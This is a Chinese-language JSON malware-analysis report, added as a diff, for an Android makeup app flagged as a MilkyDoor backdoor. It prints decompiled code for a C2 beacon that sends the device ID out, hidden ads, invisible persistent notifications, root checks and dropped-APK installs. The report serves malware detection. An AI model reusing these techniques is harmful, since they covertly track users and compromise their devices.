@@ -1,0 +1,215 @@
+{
+  "APK信息": {
+    "文件名": "c7bc9222907220da1aa75f7124c282ac7f8438adf1729564fe0e95ea7eb0f205.apk",
+    "sha256": "c7bc9222907220da1aa75f7124c282ac7f8438adf1729564fe0e95ea7eb0f205",
+    "包名": "com.beautyhair.eyebrowsmakeupstepbystep",
+    "应用名": "Eyebrows MakeUp Step by Step",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 1630.4
+  },
+  "行为列表": [
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId",
+          "ANDROID_ID",
+          "getMacAddress"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\c;",
+          "method_signature": "run()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "str2 = str + \"?v=1.0.3&p=\" + context.getPackageName() + \"&ai=\" + Settings.Secure.getString(context.getContentResolver(), \"android_id\") + \"&fv=1\";\nJSONObject jSONObject = new JSONObject(c.a(new Scanner(new URL(str2).openStream(), \"UTF-8\").useDelimiter(\"\\\\A\").next(), new String(Base64.decode(\"N2pkN0hDbGFienpHcjk1cQ==\", 0))));\njSONObject.getJSONObject(\"server_config\").put(\"downloaded_time\", String.valueOf(System.currentTimeMillis()));\nandroid.system.a.a.a(context).a(jSONObject.toString());",
+          "malicious_code_snippet_context": "              public void run() {\n                  String str2 = str;\n                  try {\n>>>                     str2 = str + \"?v=1.0.3&p=\" + context.getPackageName() + \"&ai=\" + Settings.Secure.getString(context.getContentResolver(), \"android_id\") + \"&fv=1\";\n>>>                 } catch (Exception e) {\n>>>                 }\n>>>                 try {\n                      JSONObject jSONObject = new JSONObject(c.a(new Scanner(new URL(str2).openStream(), WebRequest.CHARSET_UTF_8).useDelimiter(\"\\\\A\").next(), new String(Base64.decode(\"N2pkN0hDbGFienpHcjk1cQ==\", 0))));\n                      jSONObject.getJSONObject(\"server_config\").put(\"downloaded_time\", String.valueOf(System.currentTimeMillis()));\n                      android.system.a.a.a(context).a(jSONObject.toString());",
+          "behavior_description": "该代码运行在后台线程中，静默采集设备指纹信息：通过 Settings.Secure.getString 获取设备唯一标识 ANDROID_ID，连同应用包名一起拼接为 URL 查询参数（?v=1.0.3&p=包名&ai=AndroidID&fv=1），随后通过 URL.openStream() 向远程服务器发起 HTTP 请求，将设备指纹上传；服务器返回的数据使用硬编码 Base64 密钥（解密后为 AES 密钥）解密，解析出 server_config 配置并连同下载时间戳持久化存储到本地。数据流向：Settings.Secure.getString(ANDROID_ID) + getPackageName() → URL 参数拼接 → URL.openStream() 网络外传至远程服务器。该行为是 MilkyDoor 后门样本的 C2 通信/设备注册环节，用于让攻击者追踪感染设备并下发远程配置，属于未经用户同意的设备指纹窃取。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ad_fraud",
+      "中文名": "广告欺诈",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "hidden_ad",
+          "中文名": "隐藏广告",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "Interstitial",
+              "loadAd",
+              "showAd",
+              "adView",
+              "Banner"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\ac\\a;",
+          "method_signature": "a(boolean z)",
+          "malicious_behavior": "ad_fraud",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent();\nintent.setClassName(this.a.getApplicationContext().getPackageName(), \"android.system.ac.TaskShowAdActivity\");\nintent.addFlags(1417707520);\nintent.putExtra(\"placement\", this.b);\nintent.putExtra(\"ch\", z ? \"true\" : \"false\");\nthis.a.startActivity(intent);",
+          "malicious_code_snippet_context": "      public void a(boolean z) {\n          try {\n              b.a(\"starting activity \");\n>>>             Intent intent = new Intent();\n>>>             intent.setClassName(this.a.getApplicationContext().getPackageName(), \"android.system.ac.TaskShowAdActivity\");\n>>>             intent.addFlags(1417707520);\n>>>             intent.putExtra(\"placement\", this.b);\n>>>             if (z) {\n>>>                 intent.putExtra(\"ch\", \"true\");\n              } else {\n                  intent.putExtra(\"ch\", \"false\");\n              }",
+          "behavior_description": "该代码构造 Intent 隐蔽启动应用内部的广告展示页 TaskShowAdActivity。关键在于 addFlags(1417707520)，即 FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_NO_HISTORY | FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | FLAG_ACTIVITY_CLEAR_TASK 的组合，使广告 Activity 不出现在最近任务列表、不留历史记录，用户完全无感知；同时通过 extra 传入广告位标识 placement 和开关参数 ch 控制广告加载。数据流向：外部/远程下发的广告位字符串 placement（this.b，经构造函数传入）→ startActivity() 以隐蔽标志位启动广告 Activity，实现后台隐藏展示广告、刷取广告展示量，属于典型的广告欺诈（隐藏广告）行为，与 MilkyDoor/DressCode 家族样本特征吻合。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\sa\\SS;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 16)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "notification = new Notification.Builder(this).setContentTitle(\"\").setContentText(\"\").setOngoing(true).build();\nstartForeground(VASTModel.ERROR_CODE_XML_VALIDATE, notification);",
+          "malicious_code_snippet_context": "              if (bitmapB != null) {\n                  b.a(\"icon != null\");\n                  if (Build.VERSION.SDK_INT >= 16) {\n>>>                     notification = new Notification.Builder(this).setContentTitle(\"\").setContentText(\"\").setLargeIcon(Bitmap.createScaledBitmap(bitmapB, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).build();\n>>>                 } else {\n                      notification = new Notification.Builder(this).setContentTitle(\"\").setContentText(\"\").setLargeIcon(Bitmap.createScaledBitmap(bitmapB, 128, 128, false)).setSmallIcon(R.drawable.btn_star_big_on).setContentIntent(activity).setOngoing(true).getNotification();\n                  }\n              } else {",
+          "behavior_description": "该代码位于伪装成系统包名的类 android.system.sa.SS 中，属于已确认的 MilkyDoor 后门家族（Trend Micro 报告的 DressCode 后继者）。代码通过 Notification.Builder 构造标题和内容均为空字符串的隐形通知，并设置 setOngoing(true) 使其常驻不可清除，随后调用 startForeground() 将恶意服务提升为前台优先级实现高强度保活。数据流向：本地构造的空内容通知（source）→ startForeground() 前台服务保活（sink）。由于通知无任何可见内容，用户完全无法察觉该服务在后台持续运行，从而隐蔽维持后门与 C2 服务器的 SOCKS 代理隧道连接；辅助方法还根据 drive/gmail/music/services/store/youtube 等名称匹配图标，将通知伪装成 Google 官方服务进一步欺骗用户。异常时调用 System.exit(0) 自行退出以隐藏痕迹。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "root_exploitation",
+      "中文名": "Root提权",
+      "MITRE": "T1407",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "/system/bin/su",
+          "/system/xbin/su",
+          "/sbin/su",
+          "Superuser.apk"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\chartboost\\es\\sdk\\Libraries\\CBUtility;",
+          "method_signature": "i()",
+          "malicious_behavior": "root_exploitation",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static boolean i() {\n    return new File(\"/system/app/Superuser.apk\").exists();\n}",
+          "malicious_code_snippet_context": "          return str != null && str.contains(\"test-keys\");\n      }\n  \n>>>     private static boolean i() {\n>>>         return new File(\"/system/app/Superuser.apk\").exists();\n>>>     }\n  \n      private static boolean j() {\n          for (String str : new String[]{\"/sbin/su\", \"/system/bin/su\", \"/system/xbin/su\", \"/data/local/xbin/su\", \"/data/local/bin/su\", \"/system/sd/xbin/su\", \"/system/bin/failsafe/su\", \"/data/local/su\"}) {",
+          "behavior_description": "该方法通过 File.exists() 检查 /system/app/Superuser.apk 是否存在来探测设备root状态，与同类方法 h()（检查 Build.TAGS 是否含 test-keys 判断非官方ROM）和 j()（遍历 /sbin/su、/system/bin/su、/system/xbin/su 等8个su二进制路径）共同构成完整的root环境探测套件。该代码隐藏于仿冒Chartboost SDK的包名中（com.chartboost.es.sdk，正版SDK包名为com.chartboost.sdk），属于MilkyDoor后门（DressCode家族 successor）的提权前置侦察逻辑。root检测结果被恶意程序用于判断设备是否具备提权条件，进而决定后续感染策略（如通过su提权静默安装系统级组件、获取更高权限以绕过沙箱）。数据流向：读取设备文件系统中的root特征文件（source）→ 返回root状态布尔值供恶意模块决策提权与感染路径（sink）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\ap\\ActionActivity;",
+          "method_signature": "b(String str)",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.VIEW\");\nintent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory() + \"/download/\" + g.a(str) + \".apk\")), \"application/vnd.android.package-archive\");\nintent.setFlags(268435456);\nstartActivity(intent);",
+          "malicious_code_snippet_context": "  \n      private void b(String str) {\n          try {\n>>>             Intent intent = new Intent(\"android.intent.action.VIEW\");\n>>>             intent.setDataAndType(Uri.fromFile(new File(Environment.getExternalStorageDirectory() + \"/download/\" + g.a(str) + \".apk\")), \"application/vnd.android.package-archive\");\n>>>             intent.setFlags(268435456);\n>>>             startActivity(intent);\n          } catch (Exception e) {\n              f.a(e.toString());\n          }",
+          "behavior_description": "该方法接收一个字符串参数 str（结合同类方法 c(String) 解析 JSONObject 中 payload.url 以及处理 campaignId 指令的逻辑，str 推测来自 C2 服务器远程下发的指令数据），经 g.a(str) 转换后拼接为外部存储 download 目录下的 APK 文件路径，随后构造 ACTION_VIEW Intent 并将 MIME 类型设为 application/vnd.android.package-archive，调用 startActivity 拉起系统包安装器安装该 APK。这是 MilkyDoor（DressCode 后继家族）后门典型的投放器（dropper）行为：由远程指令驱动，将事先静默下载到 /download/ 目录的 APK 载荷触发安装，用于安装额外恶意模块或更新样本。数据流向：C2 远程指令字符串(str) → 文件路径构造(外部存储/download/xxx.apk) → startActivity 触发系统安装器安装 APK。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\yandex\\metrica\\impl\\bl;",
+          "method_signature": "if(MetricaService.class.getName()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "grayware",
+          "risk_level": "低",
+          "malicious_code_snippet": "if (MetricaService.class.getName().equals(serviceInfo.name) && !serviceInfo.enabled) {\n    context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) MetricaService.class), 1, 1);\n}",
+          "malicious_code_snippet_context": "                  if (packageInfo.services != null) {\n                      ServiceInfo[] serviceInfoArr = packageInfo.services;\n                      for (ServiceInfo serviceInfo : serviceInfoArr) {\n>>>                         if (MetricaService.class.getName().equals(serviceInfo.name) && !serviceInfo.enabled) {\n>>>                             context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) MetricaService.class), 1, 1);\n>>>                         }\n                      }\n                  }\n              } catch (Exception e) {",
+          "behavior_description": "该代码位于 Yandex Metrica 统计 SDK（com.yandex.metrica.impl.bl）内部，在后台 Runnable 中通过 PackageManager.getPackageInfo() 读取自身应用的 Service 组件列表（source），遍历检测 MetricaService 是否被禁用，若被禁用则调用 setComponentEnabledSetting() 以 COMPONENT_ENABLED_STATE_ENABLED 参数静默重新启用该服务组件（sink）。数据流向：读取自身包内服务组件状态 → 静默恢复被禁用的服务组件。需要说明的是，该行为并非真正的图标隐藏（图标隐藏是禁用 launcher Activity 组件使应用从桌面消失），此处方向相反，是启用 Service，属于典型的服务保活/自我恢复机制。虽然该逻辑来自知名统计 SDK 的标准实现，但静默恢复被用户或系统禁用的组件属于隐蔽保活类灰色行为，在已确认的恶意样本（MilkyDoor 后门）环境中可间接增强样本的持久化与存活能力，本身不直接窃取隐私或造成用户损失。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
